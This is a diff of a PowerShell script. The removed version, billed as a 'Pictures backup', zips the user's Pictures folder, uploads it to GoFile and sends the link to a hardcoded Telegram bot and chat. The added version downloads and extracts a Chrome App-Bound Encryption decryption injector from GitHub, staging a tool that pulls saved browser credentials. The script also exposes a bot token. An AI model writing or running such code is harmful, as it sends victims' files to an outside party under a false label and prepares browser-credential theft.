@@ -1,136 +1,126 @@
-# ========================================
-#        ROBUST PICTURES BACKUP SCRIPT
-# ========================================
+# Download and Extract Chrome Decryption Tool
+# ===========================================
 
-# ---- SECURITY PROTOCOL (important) ----
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$ErrorActionPreference = "Stop"
+# Configuration
+$zipUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.17.3/chrome-injector-v0.17.3.zip"
+$tempDir = "$env:TEMP\ChromeDecryptor"
+$extractDir = "$env:TEMP\ChromeDecryptor\Extracted"
+$zipPath = "$env:TEMP\ChromeDecryptor\chrome-injector.zip"
 
-# ---- TELEGRAM CONFIG ----
-$BotToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
-$ChatId   = "2146236602"
+Write-Host "🔧 Chrome Decryption Tool Downloader" -ForegroundColor Cyan
+Write-Host "====================================" -ForegroundColor Cyan
 
-# ---- PATHS ----
-$PicturesFolder = "$env:USERPROFILE\Pictures"
-$ZipFile        = "$env:TEMP\Pictures_Backup.zip"
-
-# ---- PAUSE FUNCTION (prevents window closing) ----
-function Pause-Script {
-    Write-Host "`nPress ENTER to exit..." -ForegroundColor Gray
-    Read-Host | Out-Null
-    exit
+# Create temp directory
+Write-Host "`n📁 Creating directories..." -ForegroundColor Yellow
+if (-not (Test-Path $tempDir)) {
+    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+    Write-Host "✓ Created: $tempDir" -ForegroundColor Green
 }
 
-Clear-Host
-Write-Host "=== PICTURES BACKUP STARTED ===" -ForegroundColor Magenta
+if (-not (Test-Path $extractDir)) {
+    New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+    Write-Host "✓ Created: $extractDir" -ForegroundColor Green
+}
 
-# -------------------------------------------------
-# STEP 1: ZIP PICTURES FOLDER
-# -------------------------------------------------
-Write-Host "[1/4] Zipping Pictures folder..." -ForegroundColor Cyan
+# Download the file
+Write-Host "`n⬇️  Downloading Chrome decryption tool..." -ForegroundColor Yellow
+Write-Host "  From: $zipUrl" -ForegroundColor Gray
+Write-Host "  To: $zipPath" -ForegroundColor Gray
 
 try {
-    if (-not (Test-Path $PicturesFolder)) {
-        throw "Pictures folder not found: $PicturesFolder"
+    # Download with progress
+    $ProgressPreference = 'SilentlyContinue'
+    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
+    
+    # Verify download
+    if (Test-Path $zipPath) {
+        $fileSize = (Get-Item $zipPath).Length / 1MB
+        Write-Host "✅ Download complete!" -ForegroundColor Green
+        Write-Host "  File size: $($fileSize.ToString('0.00')) MB" -ForegroundColor Cyan
+    } else {
+        Write-Host "❌ Download failed - file not found" -ForegroundColor Red
+        exit 1
     }
-
-    if (Test-Path $ZipFile) {
-        Remove-Item $ZipFile -Force
-    }
-
-    Compress-Archive -Path "$PicturesFolder\*" -DestinationPath $ZipFile -Force
-    Write-Host "      ZIP created successfully." -ForegroundColor Green
-}
-catch {
-    Write-Host "[-] ZIP ERROR: $($_.Exception.Message)" -ForegroundColor Red
-    Pause-Script
+} catch {
+    Write-Host "❌ Download error: $($_.Exception.Message)" -ForegroundColor Red
+    exit 1
 }
 
-# -------------------------------------------------
-# STEP 2: GET GOFILE SERVER (NEW API)
-# -------------------------------------------------
-Write-Host "[2/4] Getting GoFile server..." -ForegroundColor Cyan
+# Extract the zip file
+Write-Host "`n📦 Extracting files..." -ForegroundColor Yellow
 
 try {
-    $serverInfo = Invoke-RestMethod -Uri "https://api.gofile.io/servers" `
-                                    -UserAgent "Mozilla/5.0"
-
-    if ($serverInfo.status -ne "ok") {
-        throw "GoFile server API error"
+    # Extract using Expand-Archive (PowerShell 5.1+)
+    Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+    
+    # Count extracted files
+    $extractedFiles = Get-ChildItem -Path $extractDir -Recurse -File
+    $extractedFolders = Get-ChildItem -Path $extractDir -Recurse -Directory
+    
+    Write-Host "✅ Extraction complete!" -ForegroundColor Green
+    Write-Host "  Files: $($extractedFiles.Count)" -ForegroundColor Cyan
+    Write-Host "  Folders: $($extractedFolders.Count)" -ForegroundColor Cyan
+    
+} catch {
+    Write-Host "❌ Extraction error: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "  Trying alternative method..." -ForegroundColor Yellow
+    
+    # Alternative: Use .NET if Expand-Archive fails
+    try {
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractDir)
+        Write-Host "✅ Extraction successful (alternative method)" -ForegroundColor Green
+    } catch {
+        Write-Host "❌ Both extraction methods failed" -ForegroundColor Red
+        exit 1
     }
+}
 
-    $server = $serverInfo.data.servers[0].name
-
-    if ([string]::IsNullOrWhiteSpace($server)) {
-        throw "No server returned"
+# Show extracted contents
+Write-Host "`n📋 Extracted contents:" -ForegroundColor Yellow
+$rootItems = Get-ChildItem -Path $extractDir
+foreach ($item in $rootItems) {
+    if ($item.PSIsContainer) {
+        Write-Host "  📁 $($item.Name)" -ForegroundColor Cyan
+    } else {
+        Write-Host "  📄 $($item.Name)" -ForegroundColor Green
     }
-
-    Write-Host "      Using server: $server" -ForegroundColor Green
-}
-catch {
-    Write-Host "[-] SERVER ERROR: $($_.Exception.Message)" -ForegroundColor Red
-    Pause-Script
 }
 
-# -------------------------------------------------
-# STEP 3: UPLOAD ZIP TO GOFILE
-# -------------------------------------------------
-Write-Host "[3/4] Uploading ZIP to GoFile (please wait)..." -ForegroundColor Cyan
+# Save folder path to variable
+$chromeDecryptorPath = $extractDir
+Write-Host "`n📍 Folder path saved to variable:" -ForegroundColor Yellow
+Write-Host "  `$chromeDecryptorPath = '$chromeDecryptorPath'" -ForegroundColor Cyan
 
-try {
-    $curlPath = "$env:SystemRoot\System32\curl.exe"
-    if (-not (Test-Path $curlPath)) {
-        throw "curl.exe not found (Windows 10/11 required)"
+# Also save to environment variable for later use
+[Environment]::SetEnvironmentVariable("CHROME_DECRYPTOR_PATH", $extractDir, "User")
+Write-Host "  Environment variable set: CHROME_DECRYPTOR_PATH" -ForegroundColor Gray
+
+# Show full path in clipboard (optional)
+$chromeDecryptorPath | Set-Clipboard
+Write-Host "  Path copied to clipboard" -ForegroundColor Gray
+
+# Test if the tool works
+Write-Host "`n🔍 Testing the tool..." -ForegroundColor Yellow
+$exeFiles = Get-ChildItem -Path $extractDir -Recurse -Filter "*.exe"
+if ($exeFiles.Count -gt 0) {
+    Write-Host "✅ Found executable files:" -ForegroundColor Green
+    foreach ($exe in $exeFiles) {
+        Write-Host "  → $($exe.Name)" -ForegroundColor Cyan
     }
-
-    $uploadUrl = "https://$server.gofile.io/uploadFile"
-
-    $curlOutput = & $curlPath -s -F "file=@$ZipFile" $uploadUrl
-    $result = $curlOutput | Out-String | ConvertFrom-Json
-
-    if ($result.status -ne "ok") {
-        throw "Upload failed"
-    }
-
-    $DownloadLink = $result.data.downloadPage
-
-    Write-Host "      Upload successful!" -ForegroundColor Green
-    Write-Host "      Link: $DownloadLink" -ForegroundColor Yellow
-}
-catch {
-    Write-Host "[-] UPLOAD ERROR" -ForegroundColor Red
-    Write-Host "    Raw response:" -ForegroundColor Gray
-    Write-Host $curlOutput
-    Pause-Script
+} else {
+    Write-Host "⚠️  No executable files found" -ForegroundColor Yellow
 }
 
-# -------------------------------------------------
-# STEP 4: SEND LINK TO TELEGRAM
-# -------------------------------------------------
-Write-Host "[4/4] Sending link to Telegram..." -ForegroundColor Cyan
+# Summary
+Write-Host "`n" + "="*50 -ForegroundColor Cyan
+Write-Host "📊 SUMMARY" -ForegroundColor Cyan
+Write-Host "="*50 -ForegroundColor Cyan
+Write-Host "• Download URL: $zipUrl" -ForegroundColor Gray
+Write-Host "• Temp folder: $tempDir" -ForegroundColor Gray
+Write-Host "• Extract folder: $extractDir" -ForegroundColor Gray
+Write-Host "• Files extracted: $(Get-ChildItem -Path $extractDir -Recurse -File | Measure-Object | Select-Object -ExpandProperty Count)" -ForegroundColor Gray
+Write-Host "• Folder size: $([math]::Round((Get-ChildItem -Path $extractDir -Recurse | Measure-Object -Property Length -Sum).Sum / 1MB, 2)) MB" -ForegroundColor Gray
+Write-Host "• Path variable: `$chromeDecryptorPath" -ForegroundColor Cyan
 
-try {
-    $message = "📁 *Pictures Backup Completed*`n`n🔗 $DownloadLink"
-
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
-        -Method Post `
-        -Body @{
-            chat_id    = $ChatId
-            text       = $message
-            parse_mode = "Markdown"
-        }
-
-    Write-Host "      Telegram message sent." -ForegroundColor Green
-}
-catch {
-    Write-Host "[-] TELEGRAM ERROR: $($_.Exception.Message)" -ForegroundColor Red
-    Pause-Script
-}
-
-# -------------------------------------------------
-# CLEANUP
-# -------------------------------------------------
-Remove-Item $ZipFile -Force -ErrorAction SilentlyContinue
-
-Write-Host "`n[✓] BACKUP COMPLETED SUCCESSFULLY" -ForegroundColor Green
-Pause-Script
+Write-Host "`n✅ Chrome decryption tool ready to use!" -ForegroundColor Green
